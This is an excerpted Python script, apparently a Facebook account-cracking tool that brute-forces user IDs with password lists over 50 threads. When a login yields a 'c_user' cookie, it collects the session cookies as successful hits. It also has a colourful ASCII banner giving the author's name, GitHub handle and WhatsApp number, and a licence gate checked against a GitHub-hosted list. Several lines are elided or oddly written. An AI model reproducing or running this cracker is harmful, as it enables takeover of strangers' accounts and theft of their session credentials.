...
╚════██║██╔══██║██╔══██║██║███╗██║██║   ██║██║╚██╗██║
███████║██║  ██║██║  ██║╚███╔███╔╝╚██████╔╝██║ ╚████║
╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚══╝╚══╝  ╚═════╝ ╚═╝  ╚═══╝█[1;97m┌━━━━━━━━━━━━━━━━━━\x1b[38;5;208m⊱\033[34;1m   \033[37;1m⊰\x1b[38;5;208m━━━━━━━━━━━━━━━━━━┐\n\033[1;97m│ \033[37;1m[\033[1;31m>_\033[1;37m] \033[1;30mAUTHOR        \033[1;35m:  \033[1;37mSHAWON AHAMED     \x1b[38;5;208m│\n\033[1;97m│ \033[37;1m[\033[1;31m>_\033[1;37m] \033[1;30mGITHUB        \033[1;35m:  \033[1;37mrtoxic85      \x1b[38;5;208m│\n\033[1;97m│ \033[37;1m[\033[1;31m>_\033[1;37m] \033[1;30mWHATSAPP      \033[1;35m:  \033[1;37m01641524685       \x1b[38;5;208m│\n\033[1;97m│ \033[37;1m[\033[1;31m>_\033[1;37m] \033[1;30mPOWER         \033[1;35m:  \033[1;31mSHAWON AHAMED      \x1b[38;5;208m│\n\033[1;97m└━━━━━━━━━━━━━━━━━━\x1b[38;5;208m⊱\033[34;1m   \033[37;1m⊰\x1b[38;5;208m━━━━━━━━━━━━━━━━━━┘\n """)
loop = 0
oks = []
cps = []
...
def update():
	voice=random.choice([' Tool is on update','try again after update','try again after sometime','tool update is running','SHAWON AHAMED is working'])
	em=random.choice(['🔥','🙄','😒','😐','😡','😈','🥱','😎'])
...
def HERON():
    ...
    if opt == '1':
    	...
    	xxr()
    if None == '2':
        _HERON_('xdg-open https://www.facebook.com/Abal.Not.Allow4685?mibextid=ZbWKwL')
        _HERON_("espeak \"Follow my Facebook account\"")
        
        return None
    if None == '3':
        _HERON_('xdg-open https://github.com/mrtoxic85')
...
def xxr():
    ...
    with ThreadPool(max_workers=50) as manshera:
        ...
        print(f'\033[1;97m│\033[1;91m[\033[1;97m×\033[1;91m]\033[1;92m TOOL OWNER   \033[1;97m: \033[1;91mSHAWON AHAMED     \033[1;97m  │')
...
def rcrack(uid,pwx,tl):
    ...
    'user-agent': pro,}
            ...
            if 'c_user' in log_cookies:
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
               # print('\r\r\33[1;30m [SHAWON-CP💔] ' +uid+ ' | ' +ps+           '  \33[0;97m\r')
                ...
                continue
        loop+=1
        brand=random.choice(['SHAWON AHAMED','SHAWON KING ','SHAWON CRACK '])
        ...
        sys.stdout.write(f"\r \33[1;90m[{colr} SHAWON\33[1;90m]{colo}✘\33[1;90m[{colorful}{loop}\33[1;90m/\33[1;92m{tl}\33[1;90m]-[OK:{xr}{len(oks)}{x}\33[1;90m]-\33[1;90m[{emoji}]  "),
        sys.stdout.flush()
    except:
        pass
...
def superuser():
    ...
    id = "99".join(uuid)
    print(logo)
    DARK=requests.get("https://github.com/mrtoxic85/control-room/blob/main/All.txt").text
    if id in DARK:
        os.system('clear')
        print(logo)
        HERON()
